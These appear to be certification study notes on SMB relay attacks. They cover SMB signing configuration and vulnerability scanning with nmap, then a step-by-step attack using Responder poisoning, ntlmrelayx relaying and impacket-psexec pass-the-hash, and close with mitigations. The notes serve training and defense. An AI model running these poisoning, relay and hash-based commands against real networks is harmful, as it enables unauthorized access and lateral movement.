# SMB Relay Attack - Complete Notes (CPTS)

---

# 🧩 1. SMB Overview

## What is SMB?

- SMB (Server Message Block) = Network file-sharing protocol
- Used for:
  - File & directory access
  - Printer sharing
  - Inter-process communication

✔ Runs on:
```
TCP Port 445
```

---

## Key Characteristics

- Client-server architecture
- Authentication:
  - NTLM
  - Kerberos
- Name Resolution Order:
  1. DNS
  2. LLMNR / NBT-NS (fallback)

---

## SMB Communication Flow

1. TCP connection (445)
2. SMB negotiation
3. Authentication (NTLM/Kerberos)
4. Session setup
5. Resource access
6. File operations

---

# 🔢 2. SMB Protocol Versions

## SMBv1 ❌

- Legacy protocol
- Vulnerable (e.g., EternalBlue, relay attacks)
- ❗ Should be disabled

---

## SMBv2 / SMBv3 ✅

- Improved performance & security
- Features:
  - Message signing
  - Encryption (SMBv3)

---

# ⚙️ 3. Configuring SMB in Windows

## Enable SMBv1 (NOT recommended)

```
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
```

### Verify

```
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
```

---

## Enable SMBv2 / SMBv3

```
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
```

### Verify

```
Get-SmbServerConfiguration | Select-Object EnableSMB2Protocol
```

---

## Disable SMBv1 (Recommended)

```
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
```

---

# 🔐 4. SMB Signing Configuration

## Disable SMB Signing (Vulnerable)

```
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
```

---

## Enable SMB Signing (Secure)

```
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

---

## Verify

```
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
```

# 💥 5. What is an SMB Relay Attack?

- Exploits **NTLM challenge-response authentication**
- No password cracking needed

## Attack Idea

Attacker:
- Intercepts authentication
- Relays it to another system
- Authenticates as victim

---

## Core Weakness

❗ NTLM does NOT verify server identity

→ Allows relay to unintended systems

---

# ⚠️ 6. Attack Preconditions

- SMB signing = disabled / not enforced
- NTLM enabled
- Network allows lateral movement
- Victim initiates authentication (or is coerced)

---

# 🔄 7. Attack Workflow

1. Poison name resolution (LLMNR/NBT-NS)
2. Victim connects to attacker
3. Capture authentication
4. Relay to target system
5. Gain access

---

# 🔍 8. Identifying Vulnerable Systems

## Nmap Scan

```
nmap -v -sT -sV -A -O -p 445 --script smb2-security-mode.nse <target>
```

### Example Output

```
Message signing enabled but not required
```

✔ Means:
→ Vulnerable to SMB relay

# 🚀 9. Attack Execution

---

## Step 1: Run Responder

```
vim Responder.conf
```

Disable:
- SMB = Off
- HTTP = Off

Enable:
- LLMNR
- NBT-NS
- mDNS

Run:

```
python Responder.py -I eth0 -dw
```

---

## Step 2: Run ntlmrelayx

Create target list:

```
echo 192.168.1.51 > targets.txt
```

Run relay:

```
ntlmrelayx.py -tf targets.txt --smb2support -i
```

---

## Step 3: Trigger Authentication

From victim:

```
\\fakehost
```

OR

```
\\attacker-ip
```

---

## Step 4: Gain Access

If successful:

- SMB session established
- Interactive shell (with `-i`)
- Privileges = victim privileges

# 🧠 10. Command Execution (Post-Exploitation)

Using Impacket:

```
impacket-psexec user@target -hashes <LM>:<NTLM>
```

---

## Important Notes

- Requires **local admin privileges**
- Without admin:
  - Limited enumeration
  - No command execution

---

# 💣 11. Impact

- Unauthorized system access
- Remote command execution
- Privilege escalation
- Lateral movement
- No password cracking required

---

# 🛡 12. Mitigation Strategies

---

## Enforce SMB Signing

✔ Prevents relay attacks

---

## Disable LLMNR & NBT-NS

✔ Stops poisoning attacks

---

## Restrict NTLM

- Prefer Kerberos
- Disable NTLM where possible

---

## Network Segmentation

✔ Limits lateral movement

---

## Least Privilege

- Restrict admin rights
- Reduce permissions

---

## Monitoring & Detection

### Tools

- Wireshark
- Zeek
- Suricata

### Indicators

- Unusual authentication patterns
- Multiple SMB sessions
- LLMNR/NBT-NS spoofing

---

# 🔥 CPTS Key Points

- SMB relay ≠ password cracking
- Works because of **NTLM weakness**
- Requires:
  - No SMB signing
  - Victim interaction
- Tools:
  - Responder
  - ntlmrelayx
  - Impacket
- Best defense:
  - SMB signing + disable LLMNR
